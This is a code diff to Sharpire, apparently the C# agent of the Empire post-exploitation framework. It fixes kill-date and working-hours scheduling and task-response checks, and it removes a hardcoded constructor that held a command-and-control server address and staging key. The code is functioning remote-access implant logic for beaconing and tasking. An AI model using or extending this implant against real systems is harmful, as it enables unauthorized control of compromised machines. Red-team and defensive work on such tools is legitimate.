@@ -63,11 +63,12 @@ namespace Sharpire
         private void Run()
         {
             ////////////////////////////////////////////////////////////////////////////////
-            if (sessionInfo.GetKillDate().CompareTo(DateTime.Now) > 0 || coms.MissedCheckins > sessionInfo.GetDefaultLostLimit())
+            if (sessionInfo.GetKillDate().CompareTo(DateTime.Now) < 0 || coms.MissedCheckins > sessionInfo.GetDefaultLostLimit())
             {
                 jobTracking.CheckAgentJobs(ref packets, ref coms);
 
-                if (packets.Length > 0)
+                // if packets are null or empty, don't send them
+                if (packets != null)
                 {
                     coms.SendMessage(packets);
                 }
@@ -89,23 +90,30 @@ namespace Sharpire
 
             ////////////////////////////////////////////////////////////////////////////////
             
-            if (null != sessionInfo.GetWorkingHoursStart() && null != sessionInfo.GetWorkingHoursEnd())
+            if (sessionInfo.GetWorkingHoursStart() != null && sessionInfo.GetWorkingHoursEnd() != null)
             {
                 DateTime now = DateTime.Now;
+                DateTime start = sessionInfo.GetWorkingHoursStart();
+                DateTime end = sessionInfo.GetWorkingHoursEnd();
 
-                if ((sessionInfo.GetWorkingHoursEnd() - sessionInfo.GetWorkingHoursStart()).Hours < 0)
+                // Fix issue where working hours end before they start (overnight shifts)
+                if (end < start)
                 {
-                    sessionInfo.SetWorkingHoursStart(sessionInfo.GetWorkingHoursStart().AddDays(-1));
+                    end = end.AddDays(1);
                 }
 
-                if (now.CompareTo(sessionInfo.GetWorkingHoursStart()) > 0 
-                    && now.CompareTo(sessionInfo.GetWorkingHoursEnd()) < 0)
+                // If now is AFTER working hours, sleep until the next period (next day's start)
+                if (now > end)
                 {
-                    TimeSpan sleep = sessionInfo.GetWorkingHoursStart().Subtract(now);
-                    if (sleep.CompareTo(0) < 0)
-                    {
-                        sleep = (sessionInfo.GetWorkingHoursStart().AddDays(1) - now);
-                    }
+                    start = start.AddDays(1);
+                }
+
+                // Compute sleep time
+                TimeSpan sleep = start - now;
+
+                // Ensure we are not passing a negative sleep time
+                if (sleep.TotalMilliseconds > 0)
+                {
                     Thread.Sleep((int)sleep.TotalMilliseconds);
                 }
             }
@@ -151,7 +159,7 @@ namespace Sharpire
             if (taskData.Length > 0)
             {
                 coms.MissedCheckins = 0;
-                if (String.Empty != Encoding.UTF8.GetString(taskData))
+                if (Convert.ToBase64String(taskData) != sessionInfo.GetDefaultResponse())
                 {
                     coms.DecodeRoutingPacket(taskData, ref jobTracking);
                 }
@@ -679,16 +687,6 @@ namespace Sharpire
         private string SessionKey;
         private byte[] SessionKeyBytes;
 
-        public SessionInfo()
-        {
-            //These settings will be the overwritten inputs for compilation 
-            ControlServers = new String[] { "http://192.168.219.128" };
-            StagingKey = "a#)JF=z_K%7S.1,-Ou{w+j9M&bcmflI4";
-            AgentLanguage = "dotnet";
-
-            SetDefaults();
-        }
-
         public SessionInfo(string[] args)
         {
             ControlServers = args[0].Split(new String[] { "," }, StringSplitOptions.RemoveEmptyEntries);
@@ -716,29 +714,6 @@ namespace Sharpire
             StagerURI = "";
             Proxy = "default";
             ProxyCreds = "";
-
-            string KillDate = "";
-            if (!string.IsNullOrEmpty(KillDate))
-            {
-                Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");
-
-                if (regex.Match(KillDate).Success)
-                    DateTime.TryParse(KillDate, out this.KillDate);
-            }
-
-            string WorkingHours = "";
-            if (!string.IsNullOrEmpty(WorkingHours))
-            {
-                Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");
-
-                string start = WorkingHours.Split(',').First();
-                if (regex.Match(start).Success)
-                    DateTime.TryParse(start, out WorkingHoursStart);
-
-                string end = WorkingHours.Split(',').Last();
-                if (regex.Match(end).Success)
-                    DateTime.TryParse(end, out WorkingHoursEnd);
-            }
         }
 
         public string[] GetControlServers() { return ControlServers; }
@@ -763,6 +738,11 @@ namespace Sharpire
         {
             this.DefaultLostLimit = DefaultLostLimit;
         }
+        
+        public void SetDefaultResponse(string DefaultResponse) { this.DefaultResponse = DefaultResponse; }
+        public string DefaultResponse { get; set; }
+
+        public string GetDefaultResponse() { return DefaultResponse; }
 
         public string GetStagerUserAgent() { return StagerUserAgent; }
         public string GetStagerURI() { return StagerURI; }
@@ -775,29 +755,51 @@ namespace Sharpire
             this.TaskURIs = profile.Split('|').First().Split(',');
             this.UserAgent = profile.Split('|').Last();
         }
-        public void SetKillDate(string KillDate)
-        {
-            Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");
-
-            if (regex.Match(KillDate).Success)
-                DateTime.TryParse(KillDate, out this.KillDate);
-        }
+        
         public void SetWorkingHoursStart(DateTime WorkingHoursStart)
         {
             this.WorkingHoursStart = WorkingHoursStart;
         }
+        public void SetKillDate(string KillDate)
+        {
+            Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");
+
+            if (string.IsNullOrWhiteSpace(KillDate))
+            {
+                this.KillDate = DateTime.MaxValue; // High Date
+            }
+            else if (regex.Match(KillDate).Success)
+            {
+                DateTime.TryParse(KillDate, out this.KillDate);
+            }
+        }
+
         public void SetWorkingHours(string WorkingHours)
         {
             Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");
 
-            string start = WorkingHours.Split('-').First();
-            if (regex.Match(start).Success)
-                DateTime.TryParse(start, out this.WorkingHoursStart);
+            if (string.IsNullOrWhiteSpace(WorkingHours))
+            {
+                // Default to 24/7 availability
+                this.WorkingHoursStart = DateTime.Today.AddHours(0);   // 00:00
+                this.WorkingHoursEnd = DateTime.Today.AddHours(23).AddMinutes(59);  // 23:59
+                return;
+            }
 
-            string end = WorkingHours.Split('-').Last();
-            if (regex.Match(end).Success)
-                DateTime.TryParse(end, out this.WorkingHoursEnd);
+            string[] times = WorkingHours.Split('-');
+            if (times.Length == 2)
+            {
+                string start = times[0].Trim();
+                string end = times[1].Trim();
+
+                if (regex.Match(start).Success)
+                    DateTime.TryParse(start, out this.WorkingHoursStart);
+
+                if (regex.Match(end).Success)
+                    DateTime.TryParse(end, out this.WorkingHoursEnd);
+            }
         }
+
         public DateTime GetWorkingHoursStart() { return WorkingHoursStart; }
         public DateTime GetWorkingHoursEnd() { return WorkingHoursEnd; }
 
